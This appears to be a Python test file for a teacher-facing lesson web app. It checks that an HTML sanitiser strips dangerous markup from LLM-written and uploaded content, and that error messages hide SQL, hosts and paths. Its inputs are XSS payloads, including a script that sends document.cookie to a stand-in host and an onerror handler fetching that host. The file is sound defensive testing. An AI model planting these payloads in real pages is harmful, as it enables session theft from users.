"""What reaches the page, and what a failure is allowed to say (Fase 0 · PR 1).

Two halves of the same idea: the teacher's browser is shown only what we meant
to show it.

**Sanitisation.** The lesson body is rendered from Markdown and marked
``| safe`` in four templates. python-markdown passes raw HTML straight through —
it dropped ``safe_mode`` in 3.0 and its docs say to sanitise the output — and
that Markdown is written by an LLM, from a corpus, from the teacher's typing,
and from text pulled out of files they upload. The upload path is the sharpest:
a PDF someone sent the teacher, opened in a tool that renders its extract.

**Error messages.** Four places put ``str(exc)`` into a field the chat renders.
That string is written for whoever reads the logs — it carries the failing SQL,
the database host, the container's absolute paths, the URL that was called.
"""

from __future__ import annotations

import httpx
import pytest
from openai import APIConnectionError, APITimeoutError, RateLimitError

from aix.webui.errors import GENERIC, report
from aix.webui.sanitize import sanitize_html

pytestmark = pytest.mark.unit


# ---------------------------------------------------------------------------
# Sanitisation — what must not survive
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "html, gone",
    [
        ("<script>alert(1)</script>", "alert"),
        ("<img src=x onerror='alert(1)'>", "onerror"),
        ("<a href='javascript:alert(1)'>x</a>", "javascript:"),
        ("<a href='data:text/html,<script>alert(1)</script>'>x</a>", "data:"),
        ("<iframe src='https://evil.example'></iframe>", "iframe"),
        ("<object data='x'></object>", "object"),
        ("<embed src='x'>", "embed"),
        ("<form action='/webui/lesson'><input name='x'></form>", "form"),
        ("<p onclick='steal()'>testo</p>", "onclick"),
        ("<style>body{display:none}</style>", "display:none"),
        ("<svg><script>alert(1)</script></svg>", "alert"),
        ("<!-- commento interno -->", "commento"),
    ],
    ids=[
        "script",
        "onerror",
        "javascript url",
        "data url",
        "iframe",
        "object",
        "embed",
        "form",
        "inline handler",
        "style",
        "svg script",
        "comment",
    ],
)
def test_the_dangerous_thing_does_not_survive(html, gone):
    assert gone not in sanitize_html(html)


def test_the_text_inside_a_stripped_tag_is_kept():
    """Dropping the tag must not drop the lesson."""
    cleaned = sanitize_html("<p onclick='steal()'>Obiettivo della lezione</p>")

    assert "Obiettivo della lezione" in cleaned
    assert "onclick" not in cleaned


# ---------------------------------------------------------------------------
# Sanitisation — what a lesson is actually made of
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "html, kept",
    [
        ("<h2>Obiettivi</h2>", "<h2>"),
        ("<ul><li>Primo</li></ul>", "<li>"),
        ("<strong>importante</strong>", "<strong>"),
        ("<table><tr><th>Strumento</th><td>Quiz</td></tr></table>", "<th>"),
        ("<pre><code>x = 1</code></pre>", "<code>"),
        ("<blockquote>citazione</blockquote>", "<blockquote>"),
        ("<a href='https://fem.digital'>fonte</a>", "href"),
        ("<img src='https://fem.digital/a.png' alt='schema'>", "alt"),
        ("<a href='mailto:docente@scuola.it'>scrivi</a>", "mailto"),
    ],
    ids=[
        "heading",
        "list",
        "emphasis",
        "table",
        "code",
        "quote",
        "link",
        "image",
        "mailto",
    ],
)
def test_a_lesson_still_renders(html, kept):
    assert kept in sanitize_html(html)


def test_an_external_link_cannot_reach_back_into_the_tab():
    cleaned = sanitize_html("<a href='https://esempio.it'>fonte</a>")

    assert "noopener" in cleaned
    assert "noreferrer" in cleaned


def test_empty_input_is_an_empty_string_not_none():
    """So a template can drop the result in without a guard."""
    assert sanitize_html("") == ""


# ---------------------------------------------------------------------------
# Sanitisation, in place: the one function that feeds the four ``| safe`` sites
# ---------------------------------------------------------------------------


def test_the_markdown_renderer_sanitises_what_it_produces():
    from aix.webui.lessons.routes import _markdown_to_html

    rendered = _markdown_to_html(
        "# Lezione\n\n<script>fetch('https://evil.example?c='+document.cookie)</script>\n\n"
        "Testo normale con **enfasi**."
    )

    assert "<script" not in rendered
    assert "document.cookie" not in rendered
    assert "<h1>" in rendered, "the legitimate markdown still renders"
    assert "<strong>enfasi</strong>" in rendered


def test_a_malicious_upload_excerpt_cannot_reach_the_page():
    """The path that matters most: a file the teacher was sent by someone else."""
    from aix.webui.lessons.routes import _markdown_to_html

    excerpt = "Programma di classe <img src=x onerror=\"fetch('//evil.example')\">"
    rendered = _markdown_to_html(f"Materiale caricato:\n\n{excerpt}")

    assert "onerror" not in rendered
    assert "evil.example" not in rendered
    assert "Programma di classe" in rendered


# ---------------------------------------------------------------------------
# Error messages
# ---------------------------------------------------------------------------

_REQUEST = httpx.Request("POST", "https://openrouter.ai/api/v1/chat/completions")


def test_the_internals_do_not_reach_the_teacher():
    exc = RuntimeError(
        "(asyncpg.exceptions.UndefinedColumnError) column lesson.foo does not exist "
        "[SQL: SELECT lesson.id FROM lesson] postgresql://aix:hunter2@10.0.0.4:5432/aix"
    )
    reported = report(exc, context="lesson_id=abc")

    for leaked in ("asyncpg", "SELECT", "hunter2", "10.0.0.4", "lesson.foo"):
        assert leaked not in str(reported)


def test_the_generic_message_says_what_to_do():
    reported = report(RuntimeError("qualcosa di interno"))

    assert reported.message == GENERIC
    assert "riprovare" in reported.message


@pytest.mark.parametrize(
    "exc, expected_word",
    [
        (
            RateLimitError("slow", response=httpx.Response(429, request=_REQUEST), body=None),
            "sovraccarico",
        ),
        (APITimeoutError(request=_REQUEST), "troppo tempo"),
        (APIConnectionError(request=_REQUEST), "contattare"),
    ],
    ids=["rate limit", "timeout", "connection"],
)
def test_a_recognised_failure_gets_a_useful_sentence(exc, expected_word):
    """'connection refused' tells a teacher nothing about whether to wait."""
    assert expected_word in report(exc).message


def test_a_subclass_is_still_recognised():
    class OurRateLimit(RateLimitError):
        pass

    exc = OurRateLimit("slow", response=httpx.Response(429, request=_REQUEST), body=None)
    assert "sovraccarico" in report(exc).message


def test_the_incident_code_ties_the_message_to_a_log_line(caplog):
    import logging

    with caplog.at_level(logging.ERROR, logger="aix.webui.errors"):
        reported = report(RuntimeError("dettaglio interno"), context="lesson_id=abc")

    assert reported.incident in caplog.text
    assert reported.incident in str(reported)
    assert "dettaglio interno" in caplog.text, "the real error still reaches the log"


def test_two_failures_get_two_codes():
    first = report(RuntimeError("a"))
    second = report(RuntimeError("b"))

    assert first.incident != second.incident
    assert len(first.incident) == 6
